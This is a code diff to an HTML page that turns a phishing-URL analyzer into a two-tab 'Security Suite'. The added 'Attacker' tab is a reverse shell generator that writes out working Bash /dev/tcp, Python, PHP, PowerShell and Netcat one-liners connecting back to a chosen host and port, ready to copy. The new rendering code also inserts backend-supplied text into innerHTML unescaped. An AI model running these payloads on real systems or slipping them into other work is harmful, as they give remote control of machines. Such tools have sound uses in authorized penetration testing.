@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhishGuard - Professional URL Analyzer</title>
+    <title>Security Suite - Attacker & Defender Tools</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Audiowide&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Inter', sans-serif;
             background-color: #0a0a0a;
-            overflow: hidden; /* Hide scrollbars from the body */
+            overflow: hidden;
         }
-
-        /* --- Animated Particle Background --- */
         #particles-js {
             position: absolute;
             width: 100%;
@@ -23,137 +21,163 @@
             top: 0;
             left: 0;
             z-index: 0;
-            background-color: #0a0a0a;
         }
-
-        /* --- Main Content Container --- */
         .main-content {
             position: relative;
             z-index: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 1rem;
+            justify-content: flex-start;
+            height: 100vh;
+            padding: 2rem 1rem;
+            overflow-y: auto;
         }
-
-        /* --- Glassmorphism Effect --- */
         .glass-card {
-            background: rgba(17, 24, 39, 0.6); /* Semi-transparent dark background */
-            backdrop-filter: blur(12px); /* The magic blur effect */
+            background: rgba(17, 24, 39, 0.6);
+            backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1); /* Subtle border */
-            border-radius: 1.5rem; /* More rounded corners */
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 1.5rem;
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-
-        .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.5);
-        }
-
-        /* --- Custom Loader --- */
         .modern-loader {
             width: 50px;
             height: 50px;
             border-radius: 50%;
             border: 4px solid rgba(255, 255, 255, 0.2);
-            border-top-color: #3b82f6; /* Blue accent */
+            border-top-color: #3b82f6;
             animation: spin 1s linear infinite;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .fade-in-up { animation: fadeInUp 0.6s ease-out forwards; opacity: 0; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        /* --- Glitch Effect Title --- */
+        .glitch-title {
+            font-family: 'Audiowide', cursive;
+            position: relative;
+            font-size: 4rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.1em;
+            animation: glitch-skew 1s infinite linear alternate-reverse;
         }
+        .glitch-title::before, .glitch-title::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            overflow: hidden;
+        }
+        .glitch-title::before {
+            left: 2px;
+            text-shadow: -2px 0 #ff00c1;
+            animation: glitch-anim-1 2s infinite linear alternate-reverse;
+        }
+        .glitch-title::after {
+            left: -2px;
+            text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1;
+            animation: glitch-anim-2 2s infinite linear alternate-reverse;
+        }
+        @keyframes glitch-anim-1 { 0%, 100% { clip-path: inset(45% 0 50% 0); } 25% { clip-path: inset(0 0 0 0); } 50% { clip-path: inset(80% 0 15% 0); } 75% { clip-path: inset(50% 0 45% 0); } }
+        @keyframes glitch-anim-2 { 0%, 100% { clip-path: inset(50% 0 45% 0); } 25% { clip-path: inset(80% 0 5% 0); } 50% { clip-path: inset(10% 0 90% 0); } 75% { clip-path: inset(0 0 0 0); } }
+        @keyframes glitch-skew { 0% { transform: skew(0deg); } 5% { transform: skew(1deg); } 10% { transform: skew(-1deg); } 20% { transform: skew(0deg); } 100% { transform: skew(0deg); } }
 
-        /* --- Smooth Transitions --- */
-        .fade-in-up {
-            animation: fadeInUp 0.6s ease-out forwards;
-            opacity: 0;
+        /* Tab styles */
+        .tab-button { transition: all 0.3s ease; }
+        .tab-button.active { color: white; }
+        .tab-indicator {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            width: 50%;
+            background-color: #3b82f6;
+            border-radius: 3px;
+            transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1), background-color 0.3s ease;
         }
         
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+        /* Attacker mode specific styles */
+        .attacker-mode .glass-card { background: rgba(20, 10, 10, 0.6); border-color: rgba(239, 68, 68, 0.2); }
+        .input-glow-blue:focus { box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
+        .input-glow-red:focus { box-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }
     </style>
 </head>
 <body>
-
-    <!-- Particle background container -->
     <div id="particles-js"></div>
 
     <div class="main-content">
-        <div class="w-full max-w-2xl mx-auto">
-            <header class="text-center mb-8">
-                <h1 class="text-5xl md:text-6xl font-black text-white mb-3 tracking-tighter">PhishGuard</h1>
-                <p class="text-lg text-gray-400">Your intelligent shield against phishing attacks.</p>
+        <div id="app-container" class="w-full max-w-3xl mx-auto">
+            <header class="text-center mb-6">
+                <h1 class="glitch-title" data-text="Security Suite">Security Suite</h1>
+                <div class="glass-card p-2 max-w-sm mx-auto mt-4">
+                    <div class="relative flex items-center justify-around bg-gray-900/50 rounded-xl">
+                        <button id="defense-tab-btn" class="tab-button w-1/2 py-3 font-bold text-gray-400 active">🛡️ Defense</button>
+                        <button id="attack-tab-btn" class="tab-button w-1/2 py-3 font-bold text-gray-400">⚔️ Attacker</button>
+                        <div id="tab-indicator" class="tab-indicator"></div>
+                    </div>
+                </div>
             </header>
 
-            <!-- Input Card -->
-            <div class="glass-card p-6 md:p-8 mb-8">
-                <form id="url-form">
-                    <label for="url-input" class="block text-sm font-medium text-gray-300 mb-3">Enter a URL to scan</label>
-                    <div class="flex flex-col sm:flex-row gap-4">
-                        <input type="url" id="url-input" placeholder="https://example.com" required
-                               class="flex-grow bg-gray-900/70 border-2 border-gray-600 text-gray-200 rounded-xl focus:ring-4 focus:ring-blue-500/50 focus:border-blue-500 block w-full p-4 transition duration-300 placeholder-gray-500">
-                        <button type="submit" id="scan-button"
-                                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 flex items-center justify-center transform hover:scale-105 shadow-lg shadow-blue-500/20">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
-                            <span>Scan URL</span>
-                        </button>
-                    </div>
-                </form>
+            <!-- Defense Section (PhishGuard) -->
+            <div id="defense-section">
+                <div class="glass-card p-6 md:p-8 mb-8">
+                    <h2 class="text-2xl font-bold text-blue-400 mb-4 tracking-tight text-center">Phishing URL Analyzer</h2>
+                    <p class="text-center text-gray-400 -mt-2 mb-6">An intelligent scanner to detect malicious links.</p>
+                    <form id="url-form">
+                        <div class="flex flex-col sm:flex-row gap-4">
+                            <input type="url" id="url-input" placeholder="https://suspicious-link.com/login" required class="flex-grow bg-gray-900/70 border-2 border-gray-600 text-gray-200 rounded-xl focus:border-blue-500 block w-full p-4 transition duration-300 placeholder-gray-500 input-glow-blue">
+                            <button type="submit" id="scan-button" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 flex items-center justify-center transform hover:scale-105 shadow-lg shadow-blue-500/20">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
+                                <span>Scan</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
             </div>
 
-            <!-- Results Section -->
-            <div id="results-container" class="space-y-6">
-                <div id="loader" class="hidden flex-col items-center justify-center p-8">
-                    <div class="modern-loader"></div>
-                    <p class="mt-4 text-gray-400">Analyzing URL... Please wait.</p>
-                </div>
-                
-                <div id="error-box" class="hidden glass-card fade-in-up bg-red-500/20 border-red-500/50 text-red-300 px-6 py-4" role="alert">
-                    <div class="flex"><div class="py-1"><svg class="h-6 w-6 text-red-400 mr-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div><div><strong class="font-bold">Error:</strong><span class="block sm:inline" id="error-message"></span></div></div>
-                </div>
-
-                <div id="result-card" class="hidden glass-card fade-in-up overflow-hidden">
-                    <div id="result-header" class="p-5 border-b flex justify-between items-center">
-                        <h2 class="text-2xl font-bold text-white" id="status-text"></h2>
-                        <button id="copy-button" class="text-gray-400 hover:text-white transition-colors" title="Copy Analysis">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
-                        </button>
-                    </div>
-                    <div class="p-6 md:p-8 grid grid-cols-1 md:grid-cols-5 gap-8 items-center">
-                        <div class="md:col-span-2 flex flex-col items-center justify-center p-4 rounded-lg">
-                            <div id="score-circle" class="relative w-36 h-36 rounded-full flex items-center justify-center text-5xl font-bold transition-colors duration-500"><span id="score-value"></span></div>
-                            <p class="text-sm text-gray-400 mt-3">Risk Score</p>
+            <!-- Attacker Section (Reverse Shell Generator) -->
+            <div id="attack-section" class="hidden">
+                 <div class="glass-card p-6 md:p-8">
+                    <h2 class="text-2xl font-bold text-red-400 mb-4 tracking-tight text-center">Advanced Reverse Shell Generator</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <label for="ip-input" class="block text-sm font-medium text-gray-300 mb-2">LHOST</label>
+                            <input type="text" id="ip-input" placeholder="10.10.10.10" required class="w-full bg-gray-900/70 border-2 border-red-500/30 text-gray-200 rounded-xl focus:border-red-500 p-3 transition duration-300 placeholder-gray-500 input-glow-red">
                         </div>
-                        <div class="md:col-span-3 space-y-5">
-                            <div>
-                                <h3 class="font-semibold text-lg text-gray-300 mb-2 flex items-center"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4zm0 6a2 2 0 00-2 2v4a2 2 0 002 2h12a2 2 0 002-2v-4a2 2 0 00-2-2H4z" clip-rule="evenodd" /></svg>Analysis Breakdown</h3>
-                                <ul id="analysis-list" class="space-y-2 list-inside text-gray-400"></ul>
-                            </div>
-                            <div>
-                                <h3 class="font-semibold text-lg text-gray-300 mb-1 flex items-center"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" /></svg>Recommendation</h3>
-                                <p class="text-gray-400" id="recommendation-text"></p>
-                            </div>
+                        <div>
+                            <label for="port-input" class="block text-sm font-medium text-gray-300 mb-2">LPORT</label>
+                            <input type="number" id="port-input" placeholder="9001" required class="w-full bg-gray-900/70 border-2 border-red-500/30 text-gray-200 rounded-xl focus:border-red-500 p-3 transition duration-300 placeholder-gray-500 input-glow-red">
                         </div>
                     </div>
+                     <div class="mb-4">
+                         <label for="shell-type" class="block text-sm font-medium text-gray-300 mb-2">Shell Type</label>
+                         <select id="shell-type" class="w-full bg-gray-900/70 border-2 border-red-500/30 text-gray-200 rounded-xl focus:border-red-500 p-3 transition duration-300 input-glow-red">
+                             <option value="bash">Bash</option>
+                             <option value="python">Python3</option>
+                             <option value="php">PHP</option>
+                             <option value="powershell">PowerShell</option>
+                             <option value="nc">Netcat</option>
+                         </select>
+                     </div>
+                     <div class="bg-black rounded-xl p-4 font-mono text-sm text-green-400 relative min-h-[6rem]">
+                         <pre class="overflow-x-auto pb-1"><code id="generated-shell"></code></pre>
+                         <button id="copy-shell-btn" class="absolute top-2 right-2 text-gray-400 hover:text-white transition-colors" title="Copy Command">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
+                         </button>
+                     </div>
                 </div>
             </div>
+
+            <!-- Common Results/Loader Section -->
+            <div id="results-container" class="space-y-6 mt-8"></div>
         </div>
 
-        <!-- Footer -->
-        <footer class="absolute bottom-4 text-center text-gray-500 text-sm">
+        <footer class="text-center text-gray-500 text-sm mt-auto pb-4">
             Created with ❤️ by <a href="https://x.com/HckN1L" target="_blank" class="font-semibold text-gray-400 hover:text-blue-400 transition-colors">@HckN1L</a>
         </footer>
     </div>
@@ -161,59 +185,56 @@
     <!-- Particles.js Library -->
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
-        particlesJS('particles-js', {"particles":{"number":{"value":80,"density":{"enable":true,"value_area":800}},"color":{"value":"#ffffff"},"shape":{"type":"circle"},"opacity":{"value":0.5,"random":false},"size":{"value":3,"random":true},"line_linked":{"enable":true,"distance":150,"color":"#ffffff","opacity":0.4,"width":1},"move":{"enable":true,"speed":6,"direction":"none","random":false,"straight":false,"out_mode":"out","bounce":false}},"interactivity":{"detect_on":"canvas","events":{"onhover":{"enable":true,"mode":"repulse"},"onclick":{"enable":true,"mode":"push"},"resize":true},"modes":{"repulse":{"distance":100,"duration":0.4},"push":{"particles_nb":4}}},"retina_detect":true});
+        // --- GLOBAL ELEMENTS & STATE ---
+        const appContainer = document.getElementById('app-container');
+        const defenseTabBtn = document.getElementById('defense-tab-btn');
+        const attackTabBtn = document.getElementById('attack-tab-btn');
+        const tabIndicator = document.getElementById('tab-indicator');
+        const defenseSection = document.getElementById('defense-section');
+        const attackSection = document.getElementById('attack-section');
+        const resultsContainer = document.getElementById('results-container');
+        let currentTypingTimeout;
+        
+        // --- TAB SWITCHING LOGIC ---
+        function switchMode(mode) {
+            if (mode === 'defense') {
+                appContainer.classList.remove('attacker-mode');
+                defenseTabBtn.classList.add('active');
+                attackTabBtn.classList.remove('active');
+                defenseSection.style.display = 'block';
+                attackSection.style.display = 'none';
+                tabIndicator.style.left = '0%';
+                tabIndicator.style.backgroundColor = '#3b82f6';
+            } else {
+                appContainer.classList.add('attacker-mode');
+                defenseTabBtn.classList.remove('active');
+                attackTabBtn.classList.add('active');
+                defenseSection.style.display = 'none';
+                attackSection.style.display = 'block';
+                tabIndicator.style.left = '50%';
+                tabIndicator.style.backgroundColor = '#ef4444';
+                updateGeneratedShell();
+            }
+            resultsContainer.innerHTML = '';
+        }
 
+        defenseTabBtn.addEventListener('click', () => switchMode('defense'));
+        attackTabBtn.addEventListener('click', () => switchMode('attack'));
+
+        // --- DEFENSE MODE (PHISHGUARD) LOGIC ---
         const urlForm = document.getElementById('url-form');
-        const urlInput = document.getElementById('url-input');
-        const scanButton = document.getElementById('scan-button');
-        const loader = document.getElementById('loader');
-        const resultCard = document.getElementById('result-card');
-        const errorBox = document.getElementById('error-box');
-        const errorMessage = document.getElementById('error-message');
-        const statusText = document.getElementById('status-text');
-        const scoreCircle = document.getElementById('score-circle');
-        const scoreValue = document.getElementById('score-value');
-        const analysisList = document.getElementById('analysis-list');
-        const recommendationText = document.getElementById('recommendation-text');
-        const resultHeader = document.getElementById('result-header');
-        const copyButton = document.getElementById('copy-button');
-
         urlForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const url = urlInput.value.trim();
+            const url = document.getElementById('url-input').value.trim();
             if (!url) { displayError("URL input cannot be empty."); return; }
-            hideResults();
-            hideError();
-            loader.style.display = 'flex';
-            scanButton.disabled = true;
-            scanButton.classList.add('opacity-50', 'cursor-not-allowed');
+            resultsContainer.innerHTML = `<div class="flex-col items-center justify-center p-8 flex"><div class="modern-loader"></div><p class="mt-4 text-gray-400">Analyzing URL...</p></div>`;
             try {
                 const analysisResult = await analyzeUrlWithBackend(url);
-                displayResults(analysisResult);
+                displayDefenseResults(analysisResult);
             } catch (error) {
                 console.error("Backend Call Failed:", error);
                 displayError("Failed to connect to the local analysis server. Is the Python script running?");
-            } finally {
-                loader.style.display = 'none';
-                scanButton.disabled = false;
-                scanButton.classList.remove('opacity-50', 'cursor-not-allowed');
             }
-        });
-
-        copyButton.addEventListener('click', () => {
-            const textToCopy = `Status: ${statusText.textContent}\nScore: ${scoreValue.textContent}\nAnalysis:\n- ${[...analysisList.children].map(li => li.textContent).join('\n- ')}\n\nRecommendation: ${recommendationText.textContent}`;
-            const textArea = document.createElement('textarea');
-            textArea.value = textToCopy;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
-            
-            // Visual feedback
-            copyButton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>';
-            setTimeout(() => {
-                copyButton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>';
-            }, 2000);
         });
 
         async function analyzeUrlWithBackend(url) {
@@ -225,34 +246,16 @@
             else { throw new Error("The backend returned an empty or invalid response."); }
         }
 
-        function displayResults(data) {
-            statusText.textContent = data.status;
-            scoreValue.textContent = Math.round(data.score);
-            recommendationText.textContent = data.recommendation;
-            
-            // Clear previous analysis points and create a list
-            analysisList.innerHTML = '';
-            const points = data.analysis_points || [data.analysis]; // Fallback for old format
-            points.forEach(point => {
-                const li = document.createElement('li');
-                li.textContent = point;
-                li.className = 'flex items-start';
-                const icon = '<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-2 mt-1 flex-shrink-0 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>';
-                li.innerHTML = icon + point;
-                analysisList.appendChild(li);
-            });
-
+        function displayDefenseResults(data) {
             const statusClasses = getStatusClasses(data.status);
-            resultHeader.className = `p-5 border-b flex justify-between items-center ${statusClasses.borderColor}`;
-            scoreCircle.className = `relative w-36 h-36 rounded-full flex items-center justify-center text-5xl font-bold transition-colors duration-500 ${statusClasses.textColor} ${statusClasses.scoreBg}`;
-            
-            resultCard.style.display = 'block';
+            const analysisPoints = (data.analysis_points || [data.analysis]).map(point => 
+                `<li class="flex items-start"><svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-2 mt-1 flex-shrink-0 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>${point}</li>`
+            ).join('');
+            const resultHTML = `<div class="glass-card fade-in-up overflow-hidden"><div class="p-5 border-b flex justify-between items-center ${statusClasses.borderColor}"><h2 class="text-2xl font-bold text-white">${data.status}</h2></div><div class="p-6 md:p-8 grid grid-cols-1 md:grid-cols-5 gap-8 items-center"><div class="md:col-span-2 flex flex-col items-center justify-center p-4 rounded-lg"><div class="relative w-36 h-36 rounded-full flex items-center justify-center text-5xl font-bold transition-colors duration-500 ${statusClasses.textColor} ${statusClasses.scoreBg}"><span>${Math.round(data.score)}</span></div><p class="text-sm text-gray-400 mt-3">Risk Score</p></div><div class="md:col-span-3 space-y-5"><div><h3 class="font-semibold text-lg text-gray-300 mb-2 flex items-center"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4zm0 6a2 2 0 00-2 2v4a2 2 0 002 2h12a2 2 0 002-2v-4a2 2 0 00-2-2H4z" clip-rule="evenodd" /></svg>Analysis Breakdown</h3><ul class="space-y-2 list-inside text-gray-400">${analysisPoints}</ul></div><div><h3 class="font-semibold text-lg text-gray-300 mb-1 flex items-center"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" /></svg>Recommendation</h3><p class="text-gray-400">${data.recommendation}</p></div></div></div></div>`;
+            resultsContainer.innerHTML = resultHTML;
         }
 
-        function hideResults() { resultCard.style.display = 'none'; }
-        function displayError(message) { errorMessage.textContent = message; errorBox.style.display = 'block'; }
-        function hideError() { errorBox.style.display = 'none'; }
-
+        function displayError(message) { resultsContainer.innerHTML = `<div class="glass-card fade-in-up bg-red-500/20 border-red-500/50 text-red-300 px-6 py-4" role="alert"><div class="flex"><div class="py-1"><svg class="h-6 w-6 text-red-400 mr-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div><div><strong class="font-bold">Error:</strong><span class="block sm:inline">${message}</span></div></div></div>`; }
         function getStatusClasses(status) {
             switch (status.toLowerCase()) {
                 case 'safe': return { borderColor: 'border-green-500/50', textColor: 'text-green-400', scoreBg: 'bg-green-500/10' };
@@ -261,6 +264,57 @@
                 default: return { borderColor: 'border-gray-600', textColor: 'text-gray-400', scoreBg: 'bg-gray-700/20' };
             }
         }
+
+        // --- ATTACKER MODE (REVERSE SHELL) LOGIC ---
+        const ipInput = document.getElementById('ip-input');
+        const portInput = document.getElementById('port-input');
+        const shellTypeSelect = document.getElementById('shell-type');
+        const generatedShellCode = document.getElementById('generated-shell');
+        const copyShellBtn = document.getElementById('copy-shell-btn');
+
+        const shellTemplates = {
+            bash: `bash -i >& /dev/tcp/{ip}/{port} 0>&1`,
+            python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
+            php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+            powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+            nc: `nc -e /bin/sh {ip} {port}`
+        };
+
+        function typeWriter(text, i) {
+            if (i < text.length) {
+                generatedShellCode.innerHTML += text.charAt(i);
+                currentTypingTimeout = setTimeout(() => typeWriter(text, i + 1), 10);
+            }
+        }
+
+        function updateGeneratedShell() {
+            clearTimeout(currentTypingTimeout);
+            generatedShellCode.innerHTML = '';
+            const ip = ipInput.value || '10.10.10.10';
+            const port = portInput.value || '9001';
+            const shellType = shellTypeSelect.value;
+            const template = shellTemplates[shellType];
+            const shellCommand = template.replace(/{ip}/g, ip).replace(/{port}/g, port);
+            typeWriter(shellCommand, 0);
+        }
+
+        ipInput.addEventListener('input', updateGeneratedShell);
+        portInput.addEventListener('input', updateGeneratedShell);
+        shellTypeSelect.addEventListener('change', updateGeneratedShell);
+        
+        copyShellBtn.addEventListener('click', () => {
+            const textToCopy = generatedShellCode.textContent;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                copyShellBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>';
+                setTimeout(() => {
+                    copyShellBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>';
+                }, 2000);
+            });
+        });
+
+        // --- INITIALIZATION ---
+        particlesJS('particles-js', {"particles":{"number":{"value":80,"density":{"enable":true,"value_area":800}},"color":{"value":"#ffffff"},"shape":{"type":"circle"},"opacity":{"value":0.5,"random":false},"size":{"value":3,"random":true},"line_linked":{"enable":true,"distance":150,"color":"#ffffff","opacity":0.4,"width":1},"move":{"enable":true,"speed":6,"direction":"none","random":false,"straight":false,"out_mode":"out","bounce":false}},"interactivity":{"detect_on":"canvas","events":{"onhover":{"enable":true,"mode":"repulse"},"onclick":{"enable":true,"mode":"push"},"resize":true},"modes":{"repulse":{"distance":100,"duration":0.4},"push":{"particles_nb":4}}},"retina_detect":true});
+        switchMode('defense');
     </script>
 </body>
 </html>
